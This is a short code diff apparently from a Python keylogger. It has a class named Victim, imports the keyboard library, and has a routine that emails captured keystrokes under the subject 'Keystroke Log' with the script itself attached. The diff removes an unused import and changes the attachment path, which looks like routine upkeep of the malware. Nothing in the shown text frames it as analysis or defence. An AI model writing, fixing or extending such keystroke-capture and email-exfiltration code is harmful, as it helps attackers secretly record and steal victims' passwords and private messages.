@@ -6,7 +6,6 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import keyboard
-import requests
 import socket
 import time
 import psutil
@@ -99,7 +98,7 @@ class Victim:
 
         subject = 'Keystroke Log'
         message = f'Keystrokes captured: {keystrokes}'
-        attachment_path = __file__  # Attach the current script file
+        attachment_path = os.path.abspath(__file__)  # Attach the current script file
         recipients = [self.email_address]
 
         email_sender.send_email_with_attachment(subject, message, attachment_path, recipients)
